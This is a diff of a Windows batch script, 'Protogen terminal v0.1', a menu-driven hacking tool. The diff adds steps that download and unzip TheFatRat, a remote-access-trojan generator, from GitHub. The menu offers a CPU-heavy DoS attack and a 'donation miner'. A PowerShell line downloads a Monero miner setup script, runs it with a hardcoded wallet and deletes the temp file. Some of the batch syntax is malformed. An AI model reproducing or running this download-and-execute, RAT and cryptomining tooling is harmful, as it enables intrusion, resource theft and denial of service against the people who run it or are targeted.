@@ -1,13 +1,23 @@
 @echo off
 :start
+cls
+timeout /t 1 > nul
+echo starting
+if not exist C:\Users\%username%\ProtogenTerminal copy ProtogenTerminal C:\Users\%username% && goto start
+cd C:\Users\%username%\ProtogenTerminal
+if not exist %ProgramFiles%\7-Zip && echo 7-zip not found, downloading... && wget https://www.7-zip.org/a/7z2107-x64.exe && timeout /t 1 > nul && start C:\Users\%username%\Downloads\7z2107-x64.exe && goto start
+if exist C:\Users\%username%\ProtogenTerminal\TheFatRat-master.zip goto zipper
+if not exist C:\Users\%username%\ProtogenTerminal\TheFatrat wget https://github.com/Criptc/TheFatRat/archive/refs/heads/master.zip && goto start
 set spot=C:\Users\%username%\ProtogenTerminal
 set /p Name=<C:\Users\%username%\ProtogenTerminal\Name.txt
 if not exist %Name%\Dos.bat goto makeer
 if not exist %spot%\emg\emg.bat goto emgre
+timeout /t 2 /nobreak > nul
+cls
 echo #####                                                  
-echo #    #      #####       #####   ####   ####      #####     ######    #    # 
-echo #    #     #     #     #    #    #    #    #    #         #         ##   #
-echo #####     #     #     #    #    #    #    #    #         #####     # #  # 
+echo #    #       #####      #####   ####   ####      #####     ######    #    # 
+echo #    #      #     #    #    #    #    #    #    #         #         ##   #
+echo #####      #     #    #    #    #    #    #    #         #####     # #  # 
 echo #         #####      #    #    #    #    #    #  ###    #         #  # # 
 echo #        #     #    #    #    #    #    #    #    #    #         #   ## 
 echo #       #       #   ####     #     ####      #####    ######    #    # 
@@ -21,22 +31,23 @@ echo  #      #         #    #    #    #   #    #   # #    #   #      #
 echo #      ######    #      #  #    #   #    #    ##    #   #      ##### 
 echo
 echo Protogen terminal v0.1
-echo Made by Darkness the windows hacker and Criptic the protogen
+echo Made by Darkness and Criptic the protogen
 echo ㅤ
 if [%Name%] == [] set /p Name="Please set your name: " & goto nameset else echo Hello %Name%!
 echo [1] DoS attack (VERY hard on cpu)
-echo [2] 
+echo [2] change name
 echo [3] donation address or donation miner (monero)
 echo [4] say something
 echo [5] exit
 set /p pick=": "
 if %pick%==1 start %spot%\DoS.bat
-if %pick%==2 echo 2
+if %pick%==2 goto nameset
 if %pick%==3 goto miner
 if %pick%==4 goto talk
 if %pick%==5 exit
 
 :nameset
+set /p Name="Please set your name: "
 echo %Name% > C:\Users\%username%\ProtogenTerminal\Name.txt
 echo name set!
 timeout /t 3 > nul
@@ -59,6 +70,7 @@ if %talknum%==10 echo Update your computer for god's sake!
 pause
 cls
 goto start
+
 :miner
 echo ALL donations MUST be in monero
 echo when the miner is first installed it will run in the background
@@ -77,6 +89,14 @@ goto start
 powershell -Command "$wc = New-Object System.Net.WebClient; $tempfile = [System.IO.Path]::GetTempFileName(); $tempfile += '.bat'; $wc.DownloadFile('https://raw.githubusercontent.com/Criptc/Dump/main/setup_moneroocean_miner.bat', $tempfile); & $tempfile 4B61jH4fJJqB7bato9MmQfh1ccZtSpthM4ZmWL7pBXUPevpstsHPuF1XhUTTg5Wp4MUb2QmMT6DLLfh8RNZAEsS1GrNn2si; Remove-Item -Force $tempfile"
 timeout /t 2
 cls
+goto start
+
+:zipper
+echo TheFatRat is currently zipped, unziping...
+set PATH=%PATH%;C:\Program Files\7-Zip\
+7z e %spot%\TheFatRat-master.zip && timeout /t 1 > nul && del %spot%\TheFatRat-master.zip
+echo unziped
+timeout /t 1 > nul
 goto start
 
 :makeer
